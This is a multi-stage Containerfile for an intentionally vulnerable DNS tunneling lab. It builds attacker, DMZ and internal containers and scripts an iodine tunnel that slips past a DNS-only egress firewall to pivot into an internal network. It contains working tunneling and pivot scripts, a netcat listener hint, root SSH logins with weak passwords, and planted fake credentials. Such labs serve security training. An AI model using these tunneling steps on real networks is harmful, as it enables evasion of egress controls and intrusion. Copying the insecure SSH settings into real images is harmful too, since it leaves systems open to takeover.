# tunneling.Containerfile
# ------------------------------------------------------------
# DNS Tunneling Lab - three-network podman pod demonstrating
# iodine DNS tunneling through an egress-restricted DMZ
#
# Networks:
#   internet  (10.89.0.0/24) - Attacker, full egress
#   dmz       (10.89.1.0/24) - Compromised host, DNS-only egress
#   internal  (10.89.2.0/24) - Target, only reachable from DMZ
#
# Build all three images:
#   podman build -t tunnel-internet --target internet -f tunneling.Containerfile .
#   podman build -t tunnel-dmz --target dmz -f tunneling.Containerfile .
#   podman build -t tunnel-internal --target internal -f tunneling.Containerfile .
#
# Setup and run the complete lab:
#   chmod +x setup-tunnel-lab.sh
#   ./setup-tunnel-lab.sh
#
# WARNING: This container is intentionally vulnerable. Run it only on an isolated
# host or lab network. Never expose it to the internet or a production network.
#
# ------------------------------------------------------------

# ── STAGE 1: Internet / Attacker Container ──
FROM docker.io/alpine:latest AS internet

RUN apk add --no-cache \
    bash \
    iodine \
    tcpdump \
    netcat-openbsd \
    openssh-client \
    curl \
    wget \
    bind-tools \
    python3 \
    vim \
    procps \
    iproute2 \
    iptables

RUN mkdir -p /lab /src

# Generate SSH keypair for the attacker
RUN ssh-keygen -t ed25519 -N '' -f /root/.ssh/id_ed25519

# iodine server startup script
RUN printf '%s\n' \
    '#!/bin/bash' \
    'set -e' \
    'echo "[*] Starting iodine server on tunnel domain: iodine.tun.example"' \
    'echo "[*] Tunnel subnet: 10.99.0.0/24 — server IP: 10.99.0.1"' \
    '' \
    '# Create the TUN interface for iodine' \
    'mkdir -p /dev/net' \
    'mknod /dev/net/tun c 10 200 2>/dev/null || true' \
    '' \
    '# Enable IP forwarding' \
    'echo 1 > /proc/sys/net/ipv4/ip_forward' \
    '' \
    '# Start iodined in foreground with password "tunnelpass"' \
    'IODINE_PASS="tunnelpass"' \
    'iodined -f -c -P "${IODINE_PASS}" 10.99.0.1 iodine.tun.example 2>&1 | tee /var/log/iodine.log &' \
    'IODINE_PID=$!' \
    '' \
    'sleep 2' \
    '' \
    '# Verify tunnel interface' \
    'ip addr show dns0 2>/dev/null && echo "[+] dns0 interface created" || echo "[-] dns0 not found"' \
    '' \
    '# Set up NAT for tunnel clients to access the internet' \
    'iptables -t nat -A POSTROUTING -s 10.99.0.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true' \
    '' \
    'echo "[+] Iodine server running (PID: $IODINE_PID)"' \
    'echo "[+] Attacker is ready. Tunnel subnet: 10.99.0.0/24"' \
    'echo "[+] Start a netcat listener: nc -lvnp 4444"' \
    '' \
    '# Keep container alive' \
    'wait $IODINE_PID' \
    > /lab/start-attacker.sh && chmod +x /lab/start-attacker.sh

# DNS traffic capture script
RUN printf '%s\n' \
    '#!/bin/bash' \
    'echo "[*] Capturing DNS traffic on port 53..."' \
    'tcpdump -i any -n port 53 -w /tmp/dns_tunnel.pcap &' \
    'echo "[+] tcpdump PID: $!"' \
    'echo "[i] Capture file: /tmp/dns_tunnel.pcap"' \
    'echo "[i] Analyze with: tcpdump -r /tmp/dns_tunnel.pcap -X"' \
    > /lab/capture-dns.sh && chmod +x /lab/capture-dns.sh

# Demo script — complete tunnel attack chain from attacker perspective
RUN printf '%s\n' \
    '#!/bin/bash' \
    'set -e' \
    'echo "=========================================="' \
    'echo "  DNS Tunneling Lab — Attack Chain"  ' \
    'echo "=========================================="' \
    'echo ""' \
    'echo "[Phase 1] Starting iodine server..."' \
    '# Already running via start-attacker.sh' \
    'sleep 1' \
    '' \
    'echo "[Phase 2] Waiting for DMZ host to connect via iodine..."' \
    'echo "  (On the DMZ host, run: iodine -f -P tunnelpass attacker-ip)"' \
    'echo "  Tunnel client IP will be 10.99.0.2"' \
    '' \
    '# Wait for client to appear' \
    'echo "[*] Watching for tunnel client (10.99.0.2)..."' \
    'for i in $(seq 1 60); do' \
    '    if ping -c 1 -W 1 10.99.0.2 >/dev/null 2>&1; then' \
    '        echo "[+] Tunnel client 10.99.0.2 is reachable!"' \
    '        break' \
    '    fi' \
    '    sleep 2' \
    '    echo -n "."' \
    'done' \
    'echo ""' \
    '' \
    'echo "[Phase 3] Accessing DMZ host through DNS tunnel..."' \
    'echo "  Ping test: $(ping -c 2 10.99.0.2 | tail -1)"' \
    '' \
    'echo "[Phase 4] Pivoting to internal network through DMZ host..."' \
    'echo "  Internal target should be at 10.89.2.10" ' \
    'echo "  (SSH through tunnel: ssh -o StrictHostKeyChecking=no root@10.99.0.2)"' \
    '' \
    'echo "[+] Demo complete. Tunnel is active."' \
    'echo "  Commands to try:"' \
    'echo "    ssh root@10.99.0.2                 # SSH to DMZ host through DNS tunnel"' \
    'echo "    curl http://10.99.0.2:8080          # DMZ-hosted relay to internal"' \
    'echo "    tcpdump -r /tmp/dns_tunnel.pcap -X  # Inspect tunneled DNS traffic"' \
    > /lab/demo-tunnel.sh && chmod +x /lab/demo-tunnel.sh

EXPOSE 53/udp
EXPOSE 22

CMD ["/lab/start-attacker.sh"]


# ── STAGE 2: DMZ / Compromised Host ──
FROM docker.io/alpine:latest AS dmz

RUN apk add --no-cache \
    bash \
    iodine \
    tcpdump \
    netcat-openbsd \
    openssh-server \
    openssh-client \
    socat \
    curl \
    wget \
    procps \
    iproute2 \
    iptables \
    python3

# Generate SSH host keys
RUN ssh-keygen -A

# Set root password for SSH (lab only)
RUN echo 'root:tunnelpass' | chpasswd
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Attacker's public key will be added by setup script
RUN mkdir -p /root/.ssh && chmod 700 /root/.ssh

# Iodine client script — connects to attacker via DNS
RUN printf '%s\n' \
    '#!/bin/bash' \
    'ATTACKER_IP="${1:?Usage: $0 <attacker-ip>}"' \
    'ATTACKER_IP_NUMERIC=$(getent ahosts "$ATTACKER_IP" | head -1 | awk "{print \$1}")' \
    '' \
    'echo "[*] DMZ Host — Starting iodine client"' \
    'echo "[*] Connecting to iodine server at ${ATTACKER_IP}"' \
    '' \
    '# Create TUN device' \
    'mkdir -p /dev/net' \
    'mknod /dev/net/tun c 10 200 2>/dev/null || true' \
    '' \
    '# Connect to iodine server directly by IP' \
    'echo "[*] Running: iodine -f -P tunnelpass -r ${ATTACKER_IP_NUMERIC}"' \
    'iodine -f -P tunnelpass -r "${ATTACKER_IP_NUMERIC}" iodine.tun.example &' \
    'IODINE_PID=$!' \
    '' \
    'sleep 5' \
    '' \
    '# Verify tunnel interface' \
    'if ip addr show dns0 2>/dev/null; then' \
    '    echo "[+] Tunnel established! dns0 interface is up."' \
    '    echo "[+] My tunnel IP should be 10.99.0.2"' \
    '    ip addr show dns0' \
    'else' \
    '    echo "[-] Tunnel interface not found. Check iodine output."' \
    'fi' \
    '' \
    'wait $IODINE_PID' \
    > /lab/connect-tunnel.sh && chmod +x /lab/connect-tunnel.sh

# Firewall setup — restrict DMZ to DNS-only egress
RUN printf '%s\n' \
    '#!/bin/bash' \
    'set -e' \
    'echo "[*] Setting up restrictive firewall on DMZ host..."' \
    '' \
    '# Default drop all output' \
    'iptables -P OUTPUT DROP' \
    'iptables -P INPUT DROP' \
    'iptables -P FORWARD DROP' \
    '' \
    '# Allow loopback' \
    'iptables -A INPUT -i lo -j ACCEPT' \
    'iptables -A OUTPUT -o lo -j ACCEPT' \
    '' \
    '# Allow DNS outbound (UDP 53) — THIS IS THE ONLY EGRESS' \
    'iptables -A OUTPUT -p udp --dport 53 -j ACCEPT' \
    '' \
    '# Allow established/related traffic' \
    'iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT' \
    'iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT' \
    '' \
    '# Allow SSH from internal network (for pivoting)' \
    'iptables -A INPUT -p tcp --dport 22 -s 10.89.2.0/24 -j ACCEPT' \
    '' \
    '# Allow iodine tunnel interface traffic' \
    'iptables -A INPUT -i dns0 -j ACCEPT' \
    'iptables -A OUTPUT -o dns0 -j ACCEPT' \
    '' \
    '# Enable forwarding from tunnel to internal network' \
    'echo 1 > /proc/sys/net/ipv4/ip_forward' \
    'iptables -A FORWARD -i dns0 -o eth1 -j ACCEPT 2>/dev/null || true' \
    'iptables -A FORWARD -i eth1 -o dns0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true' \
    'iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE 2>/dev/null || true' \
    '' \
    'echo "[+] DMZ firewall configured:"' \
    'echo "    - DNS outbound (UDP/53) to internet: ALLOWED"' \
    'echo "    - All other outbound to internet: BLOCKED"' \
    'echo "    - Inbound SSH from internal: ALLOWED"' \
    'echo "    - Tunnel forwarding: ENABLED"' \
    '' \
    '# Verify DNS is the only egress' \
    'echo "[*] Verification — trying HTTP (should fail):"' \
    'curl -s --connect-timeout 3 http://example.com && echo "FAIL: HTTP egress works" || echo "OK: HTTP blocked"' \
    '' \
    'echo "[*] Verification — trying DNS (should succeed):"' \
    'nslookup google.com 8.8.8.8 2>/dev/null && echo "OK: DNS works" || echo "FAIL: DNS blocked"' \
    > /setup-firewall.sh && chmod +x /setup-firewall.sh

# Start SSH
CMD ["/usr/sbin/sshd", "-D"]

EXPOSE 22


# ── STAGE 3: Internal Server ──
FROM docker.io/alpine:latest AS internal

RUN apk add --no-cache \
    bash \
    nginx \
    openssh-server \
    openssh-client \
    netcat-openbsd \
    curl \
    wget \
    procps \
    iproute2 \
    vim

# Configure SSH
RUN ssh-keygen -A
RUN echo 'root:internalpass' | chpasswd
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

RUN mkdir -p /root/.ssh && chmod 700 /root/.ssh

# Set up nginx with a "sensitive" flag page
RUN mkdir -p /var/www/html
RUN printf '%s\n' \
    '<!DOCTYPE html>' \
    '<html>' \
    '<head><title>Internal Corp Portal</title></head>' \
    '<body>' \
    '<h1>Internal Corporate Portal</h1>' \
    '<p>Welcome to the internal network.</p>' \
    '<hr>' \
    '<pre>' \
    'FLAG{DNS_TUNNELING_BYPASSED_EGRESS_FILTERING}' \
    '</pre>' \
    '</body>' \
    '</html>' \
    > /var/www/html/index.html

RUN printf '%s\n' \
    'FLAG{DNS_TUNNELING_BYPASSED_EGRESS_FILTERING}' \
    > /var/www/html/flag.txt

# Configure nginx to serve on port 80
RUN sed -i 's/listen 80 default_server;/listen 80;/' /etc/nginx/http.d/default.conf 2>/dev/null || true

# Nginx config for Alpine
RUN printf '%s\n' \
    'server {' \
    '    listen 80 default_server;' \
    '    root /var/www/html;' \
    '    index index.html;' \
    '    location / {' \
    '        try_files $uri $uri/ =404;' \
    '    }' \
    '}' \
    > /etc/nginx/http.d/default.conf

# Database simulation — a file with "credentials"
RUN printf '%s\n' \
    '# Internal Database Configuration' \
    'DB_HOST=db.internal.corp.com' \
    'DB_PORT=5432' \
    'DB_NAME=corp_production' \
    'DB_USER=prod_admin' \
    'DB_PASS=Sup3rS3cr3tPr0dDB!' \
    > /etc/db.conf
RUN chmod 400 /etc/db.conf

# Sensitive internal document
RUN printf '%s\n' \
    '=== CONFIDENTIAL ===' \
    'Internal Network Topology' \
    '' \
    'DMZ Subnet:     10.89.1.0/24' \
    'Internal Subnet: 10.89.2.0/24' \
    'Internet:        10.89.0.0/24' \
    '' \
    'DMZ Host:        10.89.1.10' \
    'Internal Web:    10.89.2.10' \
    'Internal DB:     10.89.2.20' \
    '' \
    'Access: DMZ host can only perform DNS queries to internet.' \
    'No outbound TCP/UDP except DNS (53) is permitted.' \
    'Internal hosts have full access to each other.' \
    '=== END ===' \
    > /etc/internal_topology.txt

# Start nginx and sshd
RUN printf '%s\n' \
    '#!/bin/sh' \
    'nginx' \
    '/usr/sbin/sshd -D' \
    > /entrypoint.sh && chmod +x /entrypoint.sh

CMD ["/entrypoint.sh"]

EXPOSE 80 22
